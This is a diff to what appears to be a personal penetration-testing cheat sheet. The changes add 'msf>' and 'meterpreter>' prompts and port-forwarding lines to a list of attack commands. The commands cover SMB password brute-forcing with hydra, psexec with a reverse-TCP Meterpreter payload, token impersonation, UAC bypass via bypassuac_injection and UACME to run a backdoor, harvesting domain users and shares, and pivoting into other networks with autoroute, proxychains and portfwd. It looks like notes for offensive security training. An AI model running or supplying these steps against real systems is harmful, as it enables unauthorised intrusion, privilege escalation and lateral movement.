@@ -89,48 +89,48 @@ hydra -L users.txt -P /usr/share/john/password.list targetIP smb -f -V
 
 
 METASPLOIT
-use exploit/windows/smb/psexec // using psexec exploit with know smb username and password
-set PAYLOAD windows/meterpreter/reverse_tcp
-run autoroute -s subnetIP/mask // pivoting new netwerk  ### VERY IMPORTANT ###
-background // setting session to background
-use auxxiliary/scanner/portscan/tcp // scanning hosts in other networks
-set RHOSTS subnetIP/mask // setting subnet/mask
-set PORTS portNUMBER
-set THREADS xx
+msf> use exploit/windows/smb/psexec // using psexec exploit with know smb username and password
+msf> set PAYLOAD windows/meterpreter/reverse_tcp
+msf> run autoroute -s subnetIP/mask // pivoting new netwerk  ### VERY IMPORTANT ###
+msf> background // setting session to background
+msf> use auxxiliary/scanner/portscan/tcp // scanning hosts in other networks
+msf> set RHOSTS subnetIP/mask // setting subnet/mask
+msf> set PORTS portNUMBER
+msf> set THREADS xx
 
-use autxiliary/scanner/smb/smb_enumshares // finding smb shares without credentials
-set rhosts
+msf> use autxiliary/scanner/smb/smb_enumshares // finding smb shares without credentials
+msf> set rhosts
 
 sessions -i NUMBER // get back into a session
-shell // getting into a shell cmd
-whoami // find out who we are
-CTR-Z // getting back into previous shell
-use incognito // executes incognito module
-list_tokens -u // getting available tokens
-impersonate_token TOKEN
-shell
-whoami // find out who we are after impersonating token
+meterpreter> shell // getting into a shell cmd
+meterpreter> whoami // find out who we are
+meterpreter> CTR-Z // getting back into previous shell
+meterpreter> use incognito // executes incognito module
+meterpreter> list_tokens -u // getting available tokens
+meterpreter> impersonate_token TOKEN
+meterpreter> shell
+meterpreter> whoami // find out who we are after impersonating token
 
 
 #### POST EXPLOITATION ####
 
 
 
-run post/windows/gather/win_privs // find out admin privs, UAC en/disabled
+meterpreter> run post/windows/gather/win_privs // find out admin privs, UAC en/disabled
 search in metasploit > search uac
-use exploit/windows/local/bypassuac_injection // set session id to the target meterpreter session
+meterpreter> use exploit/windows/local/bypassuac_injection // set session id to the target meterpreter session
 
 Manually you can download UACME from github en upload the UAC exploit in the meterpreter session.
 akagi64.exe 10 c:\users\els\downloads\exploit.exe // runs the exploit backdoor with the UAC bypass tool using option 10
 
 PILAGING
-sysinfo // gathering information about OS en  Architecture (x86/x64 <-- important for payload en compiling) 
-getuid // check user we are currently running on target machine
-run post/windows/gather/enum_services // get list of services on remote machine
-run post/windows/gather/enum_ad_users // list users from domain
-run enum_shares // list shares
-run winenum // save all information into local files to inspect them later
-run post/windows/gather/enum_applications // list installed applications
+meterpreter> sysinfo // gathering information about OS en  Architecture (x86/x64 <-- important for payload en compiling) 
+meterpreter> getuid // check user we are currently running on target machine
+meterpreter> run post/windows/gather/enum_services // get list of services on remote machine
+meterpreter> run post/windows/gather/enum_ad_users // list users from domain
+meterpreter> run enum_shares // list shares
+meterpreter> run winenum // save all information into local files to inspect them later
+meterpreter> run post/windows/gather/enum_applications // list installed applications
 
 after running shell in a meterpreter session we can use following commands (windows commands)
 wmic service get caption,startname,stat,pathname // list services
@@ -148,26 +148,30 @@ cat /etc/passwd // list users
 PIVOTING
 
 (from meterpreter)
-run arp_scanner -r subnetIP //finding hosts
+meterpreter> run arp_scanner -r subnetIP //finding hosts
 
 (from metasploit)
-use post/multi/gather/ping_sweep // finding hosts
+msf> use post/multi/gather/ping_sweep // finding hosts
 
 (from meterpreter)
-route add subnet / mask / session id // adding new route for routing traffice throug the meterpreter session
-run autoroute -s subnet/mask // adding new route for routing traffice throug the meterpreter session
+meterpreter> route add subnet / mask / session id // adding new route for routing traffice throug the meterpreter session
+meterpreter> run autoroute -s subnet/mask // adding new route for routing traffice throug the meterpreter session
 
 (from meterpreter)
-use auxialiary/scanner/portscan/tcp // running portscan
+meterpreter> use auxialiary/scanner/portscan/tcp // running portscan
 
 (from metasploit) use proxychains
-use auxiliary/server/socks4a // start a socks4a proxyserver
+msf> use auxiliary/server/socks4a // start a socks4a proxyserver
 
 /etc/proxychain.conf
 
 proxychains nmap -sT -Pn -n targetIP --top-ports 50 // port scan
 proxychains ssh user@targetIP // setting up ssh connection using proxychains
 proxychains telnet targetIP // setting up telnet connection using proxychains
+
+meterpreter> portfwd add -l 8001 -p 80 -r targetIP
+meterpreter> portfwd add -l 3333 -p 3389 -r targetIP
+
 proxychains firefox // start a web browser through pivot for accessing website in new network
 
 
